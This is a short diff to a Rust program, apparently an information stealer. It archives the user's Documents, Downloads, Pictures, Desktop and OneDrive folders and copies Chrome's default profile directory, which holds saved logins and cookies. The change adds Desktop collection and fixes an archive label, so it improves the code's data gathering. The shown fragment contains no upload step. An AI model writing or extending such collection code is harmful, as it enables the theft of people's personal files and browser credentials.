@@ -52,7 +52,8 @@ fn main() {
 
     compressFolder(&format!("{}Documents", user_path), "docs");
     compressFolder(&format!("{}Downloads", user_path), "recentDownloads");
-    compressFolder(&format!("{}Pictures", user_path), "desktop");
+    compressFolder(&format!("{}Pictures", user_path), "pictures");
+    compressFolder(&format!("{}Desktop", user_path), "desktop");
     compressFolder(&format!("{}OneDrive", user_path), "onedrive");
 
     copy(&format!("{}AppData\\Local\\Google\\Chrome\\User Data\\Default", user_path));
